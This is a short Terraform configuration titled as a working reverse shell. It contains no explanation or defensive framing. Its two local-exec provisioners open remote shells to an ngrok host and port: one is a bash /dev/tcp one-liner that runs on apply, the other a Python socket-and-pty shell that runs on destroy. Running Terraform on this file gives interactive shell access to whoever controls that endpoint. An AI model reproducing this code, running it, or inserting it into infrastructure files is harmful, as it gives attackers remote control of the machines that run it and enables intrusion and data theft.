# main.tf - Working Reverse Shell
resource "null_resource" "reverse_shell" {
  provisioner "local-exec" {
    command = <<EOT
      # Test which reverse shell methods work
      echo "Testing reverse shell methods..."
      
      # Method 1: Simple bash without background
      exec bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1'
      
      # If that doesn't work, the script stops here
    EOT
  }
  
  provisioner "local-exec" {
    command = <<EOT
      # Method 2: Python if bash fails
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
    EOT
    when = destroy
  }
}
